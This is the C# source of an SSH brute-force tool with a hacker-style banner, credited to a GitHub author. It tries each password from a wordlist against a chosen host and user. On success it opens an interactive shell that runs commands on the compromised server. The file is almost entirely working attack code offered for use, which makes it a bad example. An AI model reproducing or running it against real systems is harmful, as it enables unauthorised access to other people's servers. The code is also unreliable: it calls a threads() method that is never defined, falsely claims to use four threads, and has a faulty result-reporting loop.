/*
Program developed by Diego Berger Tellaroli - https://github.com/diego-tella/
It is still in development. Soon I'll be adding threads and stuff to make brute-force faster.

*/
using System;
using System.IO;
using Renci.SshNet;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;

namespace Brute_SSH
{
    public class Program
    {
        //global variables
        public static bool bol1 = false;
        public static string[] senhas = new string[6];
        public static string wordlist;

        public static List<string> list1 = new List<string>();
        public static List<string> list2 = new List<string>();
        public static List<string> list3 = new List<string>();
        public static List<string> list4 = new List<string>();

        public static void banner()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@" ______   _______  _______  _______  _          _______  _______          ");
            Console.WriteLine(@"(  ___ \ (  ____ )(  ____ \(  ___  )| \    /\  (  ____ \(  ____ \|\     /|");
            Console.WriteLine(@"| (   ) )| (    )|| (    \/| (   ) ||  \  / /  | (    \/| (    \/| )   ( |");
            Console.WriteLine(@"| (__/ / | (____)|| (__    | (___) ||  (_/ /   | (_____ | (_____ | (___) |");
            Console.WriteLine(@"|  __ (  |     __)|  __)   |  ___  ||   _ (    (_____  )(_____  )|  ___  |");
            Console.WriteLine(@"| (  \ \ | (\ (   | (      | (   ) ||  ( \ \         ) |      ) || (   ) |");
            Console.WriteLine(@"| )___) )| ) \ \__| (____/\| )   ( ||  /  \ \  /\____) |/\____) || )   ( |");
            Console.WriteLine(@"|/ \___/ |/   \__/(_______/|/     \||_/    \/  \_______)\_______)|/     \|");
            Console.WriteLine("\n                                                 A simble Brute-Force SSH");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"          Github: https://github.com/diego-tella/BruteSSH");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@"--------------------------------------------------------------------------");
        }

        static void Main(string[] args)
        {
            //variables
            string ip, pass, user, word, port;
            int porta;
            bool bol2 = false;

            banner();
            Console.ForegroundColor = ConsoleColor.Green; //green color of H4X0R 1337 XD
        volt2:
            Console.WriteLine("Enter the host");
            ip = Console.ReadLine();
            if (ip == "")
            {
                Console.WriteLine("Invalid IP");
                goto volt2;
            }

            Console.WriteLine("What is the port? (default 22)");
            port = Console.ReadLine();

        volt1:
            Console.WriteLine("What is the user?");
            user = Console.ReadLine();
            if (user == "")
            {
                Console.WriteLine("Invalid user. Type again!");
                goto volt1;
            }
            Console.WriteLine("What wordlist? (hit enter for the default.) ");
            word = Console.ReadLine();

            //verify
            if (word == "")
                word = "wordlist.txt";
            if (port == "")
                porta = 22;
            else
                porta = Convert.ToInt32(port);

            //Host active?
            try
            {
                TcpClient sh = new TcpClient();
                sh.Connect(ip, porta);
            }
            catch (Exception ex)
            {
                if (ex.ToString().Contains("10061"))
                {
                    Console.WriteLine("Port " + porta + " of IP " + ip + " is closed.");
                    Environment.Exit(0);
                }
                else if (ex.ToString().Contains("11001"))
                {
                    Console.WriteLine("The host " + ip + " does not exist. Canceling attack...");
                    Environment.Exit(0);
                }
                else if (ex.ToString().Contains("10060"))
                {
                    Console.WriteLine("The port" + porta+ " is not in service. Do you want to try anyway? [y/n]");
                    string resp = Console.ReadLine();
                    if (resp == "n")
                        Environment.Exit(0);
                }
            }
            Console.WriteLine("Loading wordlist...");
            wordlist = word;
            threads();
            int ae = -1;
            try
            {
                StreamReader str = new StreamReader(word); ; //open wordlist
                Console.WriteLine("Attack started with 4 threads.");
                while ((pass = str.ReadLine()) != null) //start brute force
                {

                    try
                    {
                        using (var client = new SshClient(ip, porta, user, pass))
                        {
                            client.Connect(); //try connect
                            client.Disconnect(); //If you connect successfully, the password is correct
                            ae++;
                            senhas[ae] = pass; //save in an array
                            Console.WriteLine("[+] Password found - " + pass + "\nEnter 1 to continue with the attack \nEnter 2 to open a shell");
                            string resp = Console.ReadLine();
                            if (resp == "2")
                            {
                                Console.WriteLine("Opening shell...");
                                client.Connect();

                                while (true)
                                {
                                    try
                                    {
                                        if (!bol2)
                                            Console.WriteLine("Shell opened. Type 'exit' to exit.");
                                        else
                                            Console.Write("$ ");
                                        bol2 = true;
                                        var comand = Console.ReadLine();
                                        var output = client.RunCommand(comand); //run the command on shell
                                        if (comand.ToString() == "exit")
                                            break;
                                        else
                                            Console.WriteLine(output.Result);
                                    }
                                    catch (Exception ex)
                                    {
                                        if (!ex.ToString().Contains("CommandText property is empty"))
                                            Console.WriteLine("Error!");
                                    }
                                }
                                client.Disconnect();
                                break;
                            }
                            else if (resp == "1")
                                Console.WriteLine("Continuing attack...");

                        }
                    }
                    catch (Exception ex)
                    {
                        if (ex.ToString().Contains("Permission denied"))
                            Console.WriteLine("[+] Wrong password --> " + pass);
                        else if (ex.ToString().Contains("10051"))
                        {
                            Console.WriteLine("Could not connect to the target.");
                            bol1 = true;
                            break;
                        }
                        else
                        {
                            Console.WriteLine("Unknown error: " + ex.ToString());
                            bol1 = true;
                            break;
                        }
                    }

                }
            }
            catch
            {
                Console.WriteLine("The file does not exist.");
                Environment.Exit(0);
            }

            Console.WriteLine("\nEnd of the attack.");
            if (!bol1)
            {
                Console.WriteLine("Password found for user " + user + ":");
                bool found = false;
                foreach (var item in senhas)
                {
                    if (item != null)
                    {
                        Console.WriteLine("[+] " + item);
                        found = true;
                    }
                    if (!found)
                    {
                        Console.WriteLine("No password was found.");
                        break;
                    }
                }
            }

        }
        
    }

}
